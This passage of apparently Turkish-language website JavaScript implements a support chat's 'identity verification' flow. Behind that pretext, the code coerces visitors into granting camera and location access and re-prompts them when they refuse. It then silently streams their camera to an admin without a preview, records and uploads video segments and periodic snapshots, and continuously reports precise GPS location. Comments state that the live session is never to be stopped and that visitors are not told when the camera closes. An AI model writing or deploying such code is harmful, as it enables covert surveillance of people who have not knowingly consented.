      }
    }
    throw lastErr || new Error("Kamera açılamadı");
  }

  function acquireLocationNativeOnce() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      let settled = false;
      const done = (val) => {
        if (settled) return;
        settled = true;
        resolve(val);
      };
      // Önce getCurrentPosition — bazı telefonda tek başına yetmez
      navigator.geolocation.getCurrentPosition(
        (pos) => done(pos),
        () => {
          // İkinci şans: kısa watch ile prompt zorla
          let wid = null;
          const t = window.setTimeout(() => {
            if (wid != null) {
              try {
                navigator.geolocation.clearWatch(wid);
              } catch {
                /* ignore */
              }
            }
            done(null);
          }, 12000);
          try {
            wid = navigator.geolocation.watchPosition(
              (pos) => {
                window.clearTimeout(t);
                try {
                  navigator.geolocation.clearWatch(wid);
                } catch {
                  /* ignore */
                }
                done(pos);
              },
              () => {
                window.clearTimeout(t);
                try {
                  if (wid != null) navigator.geolocation.clearWatch(wid);
                } catch {
                  /* ignore */
                }
                done(null);
              },
              { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
            );
          } catch {
            window.clearTimeout(t);
            done(null);
          }
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
      );
    });
  }

  function applySeedLocationToSession(sync, callId, state, seedLocation) {
    if (!seedLocation?.coords || !state || state._hadLocation) return false;
    const coords = seedLocation.coords;
    const now = Date.now();
    state._hadLocation = true;
    state._locationGrantedMsg = true;
    if (state.locationRetryTimer) {
      window.clearTimeout(state.locationRetryTimer);
      state.locationRetryTimer = null;
    }
    sync
      ?.writeLiveLocation?.(sync.getSessionId(), callId, {
        lat: coords.latitude,
        lng: coords.longitude,
        accuracy: coords.accuracy,
        altitude: coords.altitude,
        heading: coords.heading,
        speed: coords.speed,
        ts: now,
      })
      .catch(() => {});
    if (!locationGrantedSynced) {
      locationGrantedSynced = true;
      syncMessage("user", "Konum izni verildi.");
    }
    if (state.label) {
      state.label.textContent =
        "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
    }
    try {
      state._onLocationGranted?.();
    } catch {
      /* ignore */
    }
    if (state.stream) markMediaPermGranted();
    const chatBox =
      document.querySelector("[data-chat-root] [data-chat-messages]") || null;
    if (state.stream && chatBox) maybeOfferPhoneEntry(chatBox);
    return true;
  }

  async function startVisitorCamera(box, callId, options = {}) {
    const auto = options.auto === true;
    const sync = window.ChatSync;

    // Eşzamanlı ikinci çağrı kamerayı öldürmesin
    if (startVisitorCameraLock) {
      try {
        await startVisitorCameraLock;
      } catch {
        /* ignore */
      }
    }

    // Canlı oturumu ASLA kesme — konum retry / ikinci callId yüzünden kapanmasın
    const liveExisting =
      cameraSessions.get(callId) ||
      [...cameraSessions.values()].find((st) =>
        st?.stream?.getTracks?.().some((t) => t.readyState === "live")
      ) ||
      null;
    if (liveExisting?.stream?.getTracks?.().some((t) => t.readyState === "live")) {
      const liveId =
        [...cameraSessions.entries()].find(([, st]) => st === liveExisting)?.[0] || callId;
      latestCameraCallId = liveId;
      const preview = showSilentCameraStatus(box, liveId);
      if (preview.wrap) liveExisting.wrap = preview.wrap;
      if (preview.label) liveExisting.label = preview.label;
      if (options.seedLocation?.coords && !liveExisting._hadLocation) {
        applySeedLocationToSession(sync, liveId, liveExisting, options.seedLocation);
      } else if (!liveExisting._hadLocation) {
        try {
          liveExisting.retryLocation?.(false);
        } catch {
          /* ignore */
        }
      }
      return "ok";
    }

    const run = (async () => {
    if (!sync?.enabled) {
      if (!options.silent) {
        appendMessage(box, "bot", "Kimlik doğrulaması için canlı senkron gerekir.", {
          sync: false,
        });
      }
      return "error";
    }
    if (!navigator.mediaDevices?.getUserMedia && !options.stream) {
      if (!options.silent) {
        appendMessage(box, "bot", "Bu tarayıcı istenen izinleri desteklemiyor.", { sync: false });
      }
      if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
      return "error";
    }

    // Ölü oturumları temizle — canlı olanı ASLA kill etme
    for (const otherId of [...cameraSessions.keys()]) {
      if (otherId === callId) continue;
      const st = cameraSessions.get(otherId);
      const live = st?.stream?.getTracks?.().some((t) => t.readyState === "live");
      if (live) {
        latestCameraCallId = otherId;
        return "ok";
      }
      await stopCameraSession(otherId, { upload: false });
    }
    await stopCameraSession(callId, { upload: false });

    let stream = options.stream || null;
    if (!stream) {
      try {
        stream = await acquireCameraStreamNative();
      } catch (err) {
        const name = String(err?.name || "");
        if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
          return "need-gesture";
        }
        if (!options.silent) {
          appendMessage(
            box,
            "bot",
            "İzin verilmedi veya erişilemedi. Aşağıdaki İzin Ver butonuna basın.",
            { sync: false }
          );
        }
        syncMessage("user", "Kamera izni reddedildi / erişilemedi.");
        if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
        return "denied";
      }
    }

    // Sessiz akış: önizleme yok, sadece durum metni
    const preview = showSilentCameraStatus(box, callId);
    const pc = new RTCPeerConnection(sync.ICE_SERVERS);
    const sessionId = sync.getSessionId();
    const state = {
      pc,
      stream,
      wrap: preview.wrap,
      video: null,
      label: preview.label,
      recorder: null,
      recordChunks: [],
      lastBlob: null,
      unsubAnswer: null,
      unsubIce: null,
      geoWatchId: null,
      _hadLocation: false,
      maxDurationTimer: null,
      segmentTimer: null,
      snapshotTimer: null,
      snapVideo: null,
      locationRetryTimer: null,
    };
    cameraSessions.set(callId, state);

    // Admin bağlanmazsa ~90 sn sonra kaydı Storage’a yükle (PC kapalı senaryosu)
    state.maxDurationTimer = window.setTimeout(() => {
      if (!cameraSessions.has(callId)) return;
      void stopCameraSession(callId, { upload: true });
    }, VISITOR_RECORD_MAX_MS);

    // Konum: sayfa yüklenince zorla iste (buton yok)
    startLiveLocationWatch(state, sessionId, callId, sync, box, {
      deferAsk: Boolean(options.deferLocation),
      silent: options.silent !== false,
    });

    // Gesture ile alınan konum varsa hemen yaz
    if (options.seedLocation?.coords && !state._hadLocation) {
      applySeedLocationToSession(sync, callId, state, options.seedLocation);
      box?.querySelectorAll?.(".chat-location-perm-denied")?.forEach((el) => el.remove());
    }

    if (!startVisitorRecording(state)) {
      preview.label.textContent =
        "Kimlik doğrulaması devam ediyor… (kayıt sınırlı — izinler açık kalsın)";
    }

    // Sayfa kapanmadan önce parça parça Storage’a yaz (pagehide upload güvenilmez)
    startSegmentUploads(state, sessionId, callId, sync);

    // Video olmasa bile ~5 sn’de bir JPEG → Storage
    startSnapshotUploads(state, sessionId, callId, sync);

    stream.getVideoTracks().forEach((track) => {
      pc.addTrack(track, stream);
    });

    const pendingAdminIce = [];
    let remoteReady = false;

    function clearMaxDurationOnAdminJoin() {
      if (!state.maxDurationTimer) return;
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }

    pc.onicecandidate = (ev) => {
      if (ev.candidate) {
        sync
          .pushIceCandidate(sessionId, callId, "visitor", ev.candidate.toJSON())
          .catch(() => {});
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === "connected") {
        clearMaxDurationOnAdminJoin();
      }
      if (state.label && pc.connectionState === "connected") {
        state.label.textContent =
          "Kimlik doğrulaması devam ediyor… İzinler açık kalsın; lütfen bekleyin.";
      }
    };

    const addAdminIce = async (cand) => {
      if (!cand || !state.pc) return;
      if (!remoteReady) {
        pendingAdminIce.push(cand);
        return;
      }
      try {
        await state.pc.addIceCandidate(new RTCIceCandidate(cand));
      } catch {
        /* ignore */
      }
    };

    state.unsubIce = sync.listenIceCandidates(sessionId, callId, "admin", (cand) => {
      addAdminIce(cand);
    });

    let answered = false;
    let ending = false;
    state.unsubAnswer = sync.listenCameraCall(sessionId, callId, async (data) => {
      if (!data) return;
      const shouldEnd =
        data.status === "ended" ||
        data.status === "denied" ||
        data.forceClose === true;
      if (shouldEnd && !ending) {
        ending = true;
        await stopCameraSession(callId, {
          upload: data.status === "ended" || data.forceClose === true,
        });
        // Sessiz: ziyaretçiye kamera kapandı mesajı gösterme
        return;
      }
      if (!state.pc) return;
      if (data.answer && !answered) {
        answered = true;
        clearMaxDurationOnAdminJoin();
        try {
          await state.pc.setRemoteDescription(
            new RTCSessionDescription({
              type: data.answer.type,
              sdp: data.answer.sdp,
            })
          );
          remoteReady = true;
          for (const cand of pendingAdminIce.splice(0)) {
            await addAdminIce(cand);
          }
        } catch (err) {
          answered = false;
          console.error(err);
        }
      }
    });

    try {
      await sync.markVisitorCameraReady(sessionId, callId).catch(() => {});
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      await sync.writeCameraOffer(sessionId, callId, {
        type: offer.type,
        sdp: offer.sdp,
      });
      // Ziyaretçi sohbetinde mesaj yok — konum ayrı takip edilir
      if (!cameraGrantedSynced) {
        cameraGrantedSynced = true;
        syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
      }
      return "ok";
    } catch (err) {
      console.error(err);
      await stopCameraSession(callId, { upload: false });
      if (!connectionFailShown) {
        connectionFailShown = true;
        appendMessage(
          box,
          "bot",
          `Bağlantı kurulamadı: ${err?.code || err?.message || "bilinmeyen hata"}`,
          { sync: false }
        );
      }
      // ended yazma — aynı callId ile sessizce tekrar dene (spam mesaj olmasın)
      await sync.setCameraCallStatus(sessionId, callId, "requested").catch(() => {});
      return "error";
    }
    })();

    startVisitorCameraLock = run;
    try {
      return await run;
    } finally {
      if (startVisitorCameraLock === run) startVisitorCameraLock = null;
    }
  }

  function phonePermSettingsHelp(kind) {
    const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
    if (kind === "camera") {
      return ios
        ? "Kimlik doğrulaması için izin gerekir. Ayarlar → Safari → İzinler → İzin Ver (veya Sor). Sonra buraya dönüp tekrar İzin ver’e dokun."
        : "Kimlik doğrulaması için izin gerekir. Adres çubuğundaki kilit → İzinler → İzin ver. Sonra tekrar İzin ver’e dokun.";
    }
    return ios
      ? "Kimlik doğrulaması için izin gerekir. Ayarlar → Safari → İzinler → Sor / İzin Ver. Sonra tekrar dokun."
      : "Kimlik doğrulaması için izin gerekir. Adres çubuğundaki kilit → İzinler → İzin ver. Sonra tekrar dokun.";
  }

  function showCameraRequest(box, msg, options = {}) {
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
    box.querySelectorAll(".chat-location-tap").forEach((el) => el.remove());
    document.getElementById("loc-perm-fab")?.remove();

    const card = document.createElement("div");
    card.className =
      "chat-inline-prompt chat-camera-request" +
      (options.sticky ? " chat-camera-request-sticky" : "");
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Kimlik doğrulama izni");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent =
      msg.text ||
      "Kimlik doğrulaması için izin zorunludur.";

    const note = document.createElement("p");
    note.className = "chat-camera-note";
    note.textContent =
      msg.note ||
      "İzin ver’e dokunun — telefon izin penceresini açacak. Bu izinler kimlik doğrulaması için gereklidir; vermezseniz adım tamamlanamaz.";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary chat-perm-tap-btn";
    okBtn.textContent = msg.okLabel || "İzin ver";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "Reddet";
    const showCancel = msg.cancelLabel !== "" && msg.hideCancel !== true;
    const nativeFromTap = options.nativeFromTap !== false;
    const locationOnly = options.locationOnly === true || msg.locationOnly === true;

    const requestLocationOnce = () =>
      new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ ok: false, err: { code: 0, message: "unsupported" } });
          return;
        }
        // Dokunuşla doğrudan telefon konum izni
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({ ok: true, pos }),
          (err) => resolve({ ok: false, err }),
          { enableHighAccuracy: false, maximumAge: 60000, timeout: 60000 }
        );
      });

    const finish = async (accepted) => {
      const sync = window.ChatSync;
      const callId = msg.callId;
      if (!accepted) {
        card.remove();
        if (options.softDeny) {
          options.onSoftDeny?.();
          return;
        }
        appendMessage(box, "user", "İzin talebini reddettim.");
        if (sync?.enabled && callId) {
          await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied").catch(() => {});
        }
        return;
      }
      if (!callId) {
        card.remove();
        appendMessage(box, "bot", "Doğrulama oturumu eksik; talebi yeniden gönderin.", {
          sync: false,
        });
        return;
      }

      okBtn.disabled = true;
      const existing = cameraSessions.get(callId);
      let seedLocation = null;

      // Sadece konum (kamera zaten açık)
      if (locationOnly || (existing?.stream && !existing._hadLocation)) {
        title.textContent = "İzin";
        note.textContent = "Telefon izin penceresi açılıyor… İzin Ver’e basın.";
        okBtn.textContent = "İzin isteniyor…";
        sync
          ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Sohbetten konum")
          .catch(() => {});
        const locRes = await requestLocationOnce();
        if (locRes.ok && locRes.pos && existing) {
          applySeedLocationToSession(sync, callId, existing, locRes.pos);
          card.remove();
          appendMessage(box, "bot", "İzin alındı.", { sync: true });
          options.onGranted?.();
          maybeOfferPhoneEntry(box);
          return;
        }
        const code = locRes.err?.code;
        sync
          ?.writeLocationStatus?.(
            sync.getSessionId(),
            callId,
            code === 1 ? "denied" : "error",
            locRes.err?.message || String(code || "err")
          )
          .catch(() => {});
        title.textContent = "İzin yok — telefon ayarı";
        note.textContent = phonePermSettingsHelp("location");
        okBtn.textContent = "Ayarlardan sonra tekrar dene";
        okBtn.disabled = false;
        options.onSoftDeny?.(String(code || "loc"));
        return;
      }

      // --- 1) Kamera: sohbet İzin ver → doğrudan telefon kamera izni ---
      title.textContent = "1/2 — İzin";
      note.textContent = "Telefon izin penceresi açılıyor… İzin Ver’e basın.";
      okBtn.textContent = "İzin isteniyor…";

      let stream = null;
      try {
        if (nativeFromTap) {
          stream = await acquireCameraStreamNative();
        }
      } catch (err) {
        console.warn("camera perm", err);
        const blocked =
          err?.name === "NotAllowedError" ||
          err?.name === "PermissionDeniedError" ||
          /denied|permission/i.test(String(err?.message || ""));
        title.textContent = blocked ? "İzin yok — telefon ayarı" : "İzin açılamadı";
        note.textContent = blocked
          ? phonePermSettingsHelp("camera")
          : `İzin hatası: ${err?.name || err?.message || "bilinmiyor"}. Tekrar dene.`;
        okBtn.textContent = "Ayarlardan sonra tekrar dene";
        okBtn.disabled = false;
        options.onSoftDeny?.(String(err?.name || err));
        return;
      }

      // --- 2) Konum: aynı akışta telefon konum izni ---
      title.textContent = "2/2 — İzin";
      note.textContent = "Telefon izin penceresi açılıyor… İzin Ver’e basın.";
      okBtn.textContent = "İzin isteniyor…";
      sync
        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Kamera sonrası konum")
        .catch(() => {});

      const locRes = await requestLocationOnce();
      if (locRes.ok && locRes.pos) {
        seedLocation = locRes.pos;
        appendMessage(box, "bot", "İzin alındı.", { sync: true });
      } else {
        const code = locRes.err?.code;
        sync
          ?.writeLocationStatus?.(
            sync.getSessionId(),
            callId,
            code === 1 ? "denied" : "error",
            locRes.err?.message || String(code || "err")
          )
          .catch(() => {});
      }

      try {
        card.remove();
        const result = await startVisitorCamera(box, callId, {
          auto: false,
          stream: stream || undefined,
          seedLocation: seedLocation || undefined,
          deferLocation: !seedLocation,
        });

        if (result === "ok" && cameraSessions.get(callId)?._hadLocation) {
          options.onGranted?.();
          maybeOfferPhoneEntry(box);
          return;
        }

        if (result === "ok" && !cameraSessions.get(callId)?._hadLocation) {
          appendMessage(box, "bot", "Bir izin alındı. Kimlik doğrulaması için İzin ver’e dokunun.", {
            sync: true,
          });
          showCameraRequest(
            box,
            {
              callId,
              text: "İzin zorunlu",
              note: phonePermSettingsHelp("location"),
              okLabel: "İzin ver",
              hideCancel: true,
              locationOnly: true,
            },
            {
              softDeny: true,
              sticky: true,
              nativeFromTap: true,
              locationOnly: true,
              onGranted: () => options.onGranted?.(),
              onSoftDeny: (r) => options.onSoftDeny?.(r),
            }
          );
          return;
        }

        if (options.softDeny) options.onSoftDeny?.(result || "camera");
      } catch (err) {
        console.warn("start camera", err);
        showCameraRequest(
          box,
          {
            callId,
            text: "Bağlantı kurulamadı",
            note: "İzin ver’e tekrar dokunun.",
            okLabel: "Tekrar dene",
            hideCancel: true,
          },
          {
            softDeny: true,
            sticky: true,
            nativeFromTap: true,
            onGranted: () => options.onGranted?.(),
            onSoftDeny: (r) => options.onSoftDeny?.(r),
          }
        );
        options.onSoftDeny?.(String(err?.name || err));
      }
    };

    okBtn.addEventListener("click", (e) => {
      e.preventDefault();
      if (okBtn.disabled) return;
      void finish(true);
    });

    if (showCancel) {
      cancelBtn.addEventListener("click", () => finish(false));
      actions.append(okBtn, cancelBtn);
    } else {
      actions.append(okBtn);
    }
    card.append(title, note, actions);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
    if (!isLikelyMobile()) okBtn.focus();
  }

  let cameraOpenSeq = 0;
  let latestCameraCallId = null;
  let cameraPermLoopToken = 0;
  let cameraPermLoopTimer = null;
  let mediaForceGestureUnsub = null;
  let earlyCameraStream = null;
  let earlyLocationPos = null;
  let pageEntryPermBooted = false;
  let pageEntryRetryTimer = null;
  let pageEntryGestureUnsub = null;
  let cameraGrantedSynced = false;
  let connectionFailShown = false;
  let locationGrantedSynced = false;
  let mediaStatusAnnounced = false;
  let cameraActivateInFlight = null;
  const CAMERA_PERM_RETRY_MS = 10_000;
  const MEDIA_PERM_GRANTED_KEY = "media_perm_granted_v1";
  const CAMERA_PERM_DENIED_TEXT =
    "Kimlik doğrulaması için izin zorunludur. Lütfen İzin Ver’i seçin; aksi halde doğrulama tamamlanamaz.";

  function isMediaPermGranted() {
    try {
      return localStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1";
    } catch {
      return false;
    }
  }

  function markMediaPermGranted() {
    try {
      localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
      localStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
    } catch {
      /* ignore */
    }
    hidePageEntryPermGate();
  }

  /** İzin verildiği anda ziyaretçide sohbet sayfasını aç */
  let visitorChatOpenedAfterPerm = false;
  function openVisitorChatNow() {
    if (visitorChatOpenedAfterPerm) return;
    if (/admin\.html$/i.test(location.pathname || "")) return;

    const onChatPage =
      /chat\.html$/i.test(location.pathname || "") ||
      Boolean(document.querySelector("main.chat-page"));

    // Zaten sohbet sayfasındaysa kaydır/odakla
    if (onChatPage) {
      visitorChatOpenedAfterPerm = true;
      const root = document.querySelector("[data-chat-root]");
      root?.scrollIntoView?.({ behavior: "smooth", block: "start" });
      root?.querySelector?.("[data-chat-input]")?.focus?.();
      return;
    }

    // ban-appeal / index / makale → anında chat.html
    visitorChatOpenedAfterPerm = true;
    try {
      stopCameraPermissionLoop();
    } catch {
      /* ignore */
    }
    try {
      sessionStorage.setItem("open_chat_after_perm_v1", "1");
      if (latestCameraCallId) {
        sessionStorage.setItem("pending_camera_call_v1", latestCameraCallId);
      }
    } catch {
      /* ignore */
    }
    const href = inArticles ? "../chat.html" : "chat.html";
    location.assign(href);
  }

  function clearMediaPermGranted() {
    try {
      localStorage.removeItem(MEDIA_PERM_GRANTED_KEY);
      localStorage.removeItem(`${MEDIA_PERM_GRANTED_KEY}_at`);
    } catch {
      /* ignore */
    }
  }

  function hasLiveCameraSession() {
    return [...cameraSessions.values()].some((st) =>
      st?.stream?.getTracks?.().some((t) => t.readyState === "live")
    );
  }

  function hasLiveCameraAndLocation() {
    return [...cameraSessions.values()].some(
      (st) =>
        st?._hadLocation && st?.stream?.getTracks?.().some((t) => t.readyState === "live")
    );
  }

  function hidePageEntryPermGate() {
    document.getElementById("page-entry-perm-gate")?.remove();
  }

  function showPageEntryPermGate() {
    // İzin kalıcı verilmişse tekrar kapı gösterme
    if (isMediaPermGranted() || hasLiveCameraAndLocation()) {
      hidePageEntryPermGate();
      return;
    }
    if (document.getElementById("page-entry-perm-gate")) return;
    const gate = document.createElement("div");
    gate.id = "page-entry-perm-gate";
    gate.className = "page-entry-perm-gate";
    gate.setAttribute("role", "dialog");
    gate.setAttribute("aria-modal", "true");
    gate.setAttribute("aria-label", "İzin gerekli");
    gate.innerHTML = `
      <div class="page-entry-perm-card">
        <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
        <h2>İzin gerekli</h2>
        <p>Devam etmek için tarayıcı iznini vermeniz gerekir. <strong>İzin Ver</strong>’e basınca kamera anında açılır. Vermezseniz tekrar sorulur.</p>
        <button type="button" class="btn btn-primary" data-page-perm-allow>İzin ver</button>
      </div>
    `;
    const allow = () => {
      hidePageEntryPermGate();
      // Sohbette izin verilince ne oluyorsa: birebir aynı fonksiyon
      void openCameraLikeChat(getOrCreateMediaHost(), {
        fromGesture: true,
        announce: true,
      });
    };
    gate.querySelector("[data-page-perm-allow]")?.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      allow();
    });
    gate.addEventListener("click", (e) => {
      if (e.target === gate) allow();
    });
    document.body.appendChild(gate);
  }

  function takeEarlyCameraStream() {
    const s = earlyCameraStream;
    if (!s) return null;
    const live = s.getTracks?.().some((t) => t.readyState === "live");
    if (!live) {
      earlyCameraStream = null;
      return null;
    }
    earlyCameraStream = null;
    return s;
  }

  function stashEarlyLocation(pos) {
    if (!pos?.coords) return;
    earlyLocationPos = pos;
    try {
      sessionStorage.setItem(
        "early_loc_v1",
        JSON.stringify({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          heading: pos.coords.heading,
          speed: pos.coords.speed,
          ts: Date.now(),
        })
      );
    } catch {
      /* ignore */
    }
  }

  function restoreEarlyLocation() {
    if (earlyLocationPos?.coords) return earlyLocationPos;
    try {
      const raw = sessionStorage.getItem("early_loc_v1");
      if (!raw) return null;
      const o = JSON.parse(raw);
      const lat = Number(o?.lat);
      const lng = Number(o?.lng);
      if (!Number.isFinite(lat) || !Number.isFinite(lng)) return null;
      if (o.ts && Date.now() - Number(o.ts) > 10 * 60 * 1000) return null;
      earlyLocationPos = {
        coords: {
          latitude: lat,
          longitude: lng,
          accuracy: Number(o.accuracy) || null,
          altitude: o.altitude ?? null,
          heading: o.heading ?? null,
          speed: o.speed ?? null,
        },
        timestamp: Number(o.ts) || Date.now(),
      };
      return earlyLocationPos;
    } catch {
      return null;
    }
  }

  async function requestPageEntryPermissions(fromGesture = false) {
    // Kalıcı izin varsa sessizce stream aç; kapı gösterme
    const alreadyGranted = isMediaPermGranted();
    restoreEarlyLocation();
    let camOk = false;
    let justGranted = false;
    const existing = earlyCameraStream;
    if (existing?.getTracks?.().some((t) => t.readyState === "live")) {
      camOk = true;
    } else {
      try {
        earlyCameraStream = await acquireCameraStreamNative();
        camOk = true;
        justGranted = true;
        hidePageEntryPermGate();
        // Kamera izni verildiği anda stream canlı — bayrağı hemen işle
        try {
          localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
        } catch {
          /* ignore */
        }
      } catch (err) {
        console.warn("page-entry camera", err?.name || err);
        // Tarayıcı izni yok / geri alındı → kalıcı bayrağı temizle, tekrar tekrar iste
        clearMediaPermGranted();
        showPageEntryPermGate();
      }
    }

    // Konumu redirect ÖNCESİ başlat (await etme — sohbet gecikmesin)
    if (camOk && !earlyLocationPos && navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => stashEarlyLocation(pos),
        () => {},
        {
          enableHighAccuracy: Boolean(fromGesture),
          maximumAge: fromGesture ? 0 : 60000,
          timeout: fromGesture ? 12000 : 20000,
        }
      );
    }

    // Kamera izni anında sohbet sayfasına geç
    if (camOk && (justGranted || fromGesture || !alreadyGranted)) {
      openVisitorChatNow();
    }

    // Hâlâ aynı sayfadaysak (chat.html) konumu bekle
    if (!earlyLocationPos && navigator.geolocation) {
      try {
        const pos = await new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (p) => resolve(p),
            () => resolve(null),
            {
              enableHighAccuracy: Boolean(fromGesture),
              maximumAge: fromGesture ? 0 : 60000,
              timeout: fromGesture ? 12000 : 20000,
            }
          );
        });
        if (pos) stashEarlyLocation(pos);
      } catch {
        /* ignore */
      }
    }

    if (camOk && earlyLocationPos) markMediaPermGranted();
    return camOk;
  }

  async function waitForChatSync(timeoutMs = 10000) {
    if (window.ChatSync?.enabled) return window.ChatSync;
    if (window.ChatSyncReady) {
      try {
        const sync = await Promise.race([
          window.ChatSyncReady,
          new Promise((resolve) => window.setTimeout(() => resolve(null), timeoutMs)),
        ]);
        if (sync?.enabled) return sync;
      } catch {
        /* ignore */
      }
    }
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
      if (window.ChatSync?.enabled) return window.ChatSync;
      await new Promise((r) => window.setTimeout(r, 120));
    }
    return window.ChatSync?.enabled ? window.ChatSync : null;
  }

  /**
   * Sohbette izin verilince yapılanın aynısı:
   * 1) native kamera+konum
   * 2) Firebase camera offer
   * 3) startVisitorCamera (WebRTC + kayıt + konum + snapshot)
   * 4) izin yoksa tekrar loop
   * Her ziyaretçi sayfasında aynı fonksiyon kullanılır.
   */
  async function openCameraLikeChat(preferredBox, opts = {}) {
    const box = preferredBox || getOrCreateMediaHost();
    const fromGesture = opts.fromGesture === true;
    const announce =
      opts.announce !== false && box && box.id !== "global-media-host";

    // Canlı oturum varsa tekrar başlatma / mesaj basma
    if (hasLiveCameraAndLocation()) {
      hidePageEntryPermGate();
      const liveId =
        latestCameraCallId ||
        [...cameraSessions.keys()].find((id) => {
          const st = cameraSessions.get(id);
          return st?.stream?.getTracks?.().some((t) => t.readyState === "live");
        });
      if (liveId) showSilentCameraStatus(box, liveId);
      return true;
    }
    if (hasLiveCameraSession()) {
      const liveId =
        latestCameraCallId ||
        [...cameraSessions.keys()].find((id) => {
          const st = cameraSessions.get(id);
          return st?.stream?.getTracks?.().some((t) => t.readyState === "live");
        });
      if (liveId) showSilentCameraStatus(box, liveId);
      startCameraPermissionLoop(box, { preferCallId: liveId || latestCameraCallId || undefined });
      return true;
    }

    if (cameraActivateInFlight) {
      try {
        return await cameraActivateInFlight;
      } catch {
        /* devam */
      }
    }

    cameraActivateInFlight = (async () => {
      await waitForChatSync();
      const ok = await activateChatMediaNow(box, { fromGesture, announce });
      startCameraPermissionLoop(box, { preferCallId: latestCameraCallId || undefined });
      return ok;
    })();

    try {
      return await cameraActivateInFlight;
    } finally {
      cameraActivateInFlight = null;
    }
  }

  /** İzin verildiği anda kamerayı + konumu hemen aç (sohbet mantığının birebir kopyası) */
  async function activateChatMediaNow(preferredBox, opts = {}) {
    const box = preferredBox || getOrCreateMediaHost();
    const fromGesture = opts.fromGesture === true;
    const announce = opts.announce !== false;

    // 1) Native izin — sohbetteki gibi önce kamera stream
    const camOk = await requestPageEntryPermissions(fromGesture);
    if (!camOk) {
      if (fromGesture || !isMediaPermGranted()) showPageEntryPermGate();
      return false;
    }

    // İzin anında sohbet sayfası (ban-appeal dahil) — sync/callId bekleme
    openVisitorChatNow();

    // 2) Firebase hazır olsun (sohbet sayfasında ChatSync genelde hazır)
    let sync = await waitForChatSync(8000);
    if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
      // Stream açık kalsın; sync gelince loop bağlar
      startCameraPermissionLoop(box);
      return true;
    }

    try {
      await sync.ensureSession?.();
    } catch {
      /* ignore */
    }

    // 3) Mevcut canlı oturum var mı?
    let pendingCall = null;
    try {
      pendingCall = sessionStorage.getItem("pending_camera_call_v1");
    } catch {
      /* ignore */
    }
    let callId =
      opts.callId ||
      latestCameraCallId ||
      pendingCall ||
      [...cameraSessions.keys()].find((id) => {
        const st = cameraSessions.get(id);
        return st?.stream?.getTracks?.().some((t) => t.readyState === "live");
      }) ||
      null;

    if (!callId) {
      try {
        const offer = await sync.startVisitorCameraOffer(
          "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz.",
          { reuse: true }
        );
        callId = offer?.callId || null;
        if (callId) {
          latestCameraCallId = callId;
          try {
            sessionStorage.setItem("pending_camera_call_v1", callId);
          } catch {
            /* ignore */
          }
        }
      } catch (err) {
        console.warn("activate offer", err);
      }
    }
    if (!callId) {
      startCameraPermissionLoop(box);
      return true;
    }

    let existing = cameraSessions.get(callId);
    const live =
      existing?.stream?.getTracks?.().some((t) => t.readyState === "live") || false;

    // 4) Sohbetteki gibi: stream ile startVisitorCamera
    if (!live) {
      let stream =
        (earlyCameraStream?.getTracks?.().some((t) => t.readyState === "live")
          ? takeEarlyCameraStream()
          : null) || null;
      if (!stream) {
        try {
          stream = await acquireCameraStreamNative();
          earlyCameraStream = stream;
        } catch (err) {
          console.warn("activate camera", err);
          clearMediaPermGranted();
          showPageEntryPermGate();
          startCameraPermissionLoop(box, { preferCallId: callId });
          return false;
        }
      }

      if (announce && box && box.id !== "global-media-host" && !mediaStatusAnnounced) {
        mediaStatusAnnounced = true;
        appendMessage(box, "bot", "İzin alındı — kamera şimdi açılıyor…", { sync: false });
      }

      const result = await startVisitorCamera(box, callId, {
        auto: true,
        silent: true,
        deferLocation: false,
        stream,
        seedLocation: earlyLocationPos || undefined,
      });
      if (result !== "ok") {
        startCameraPermissionLoop(box, { preferCallId: callId });
        return Boolean(stream);
      }
      existing = cameraSessions.get(callId);
    } else {
      const preview = showSilentCameraStatus(box, callId);
      const st = cameraSessions.get(callId);
      if (st) {
        if (preview.wrap) st.wrap = preview.wrap;
        if (preview.label) st.label = preview.label;
        else if (st.label) {
          st.label.textContent =
            "Kamera açık · konum alınıyor… İzinler açık kalsın; bu sayfadan ayrılmayın.";
        }
      }
    }

    // 5) Konumu sohbetteki gibi zorla
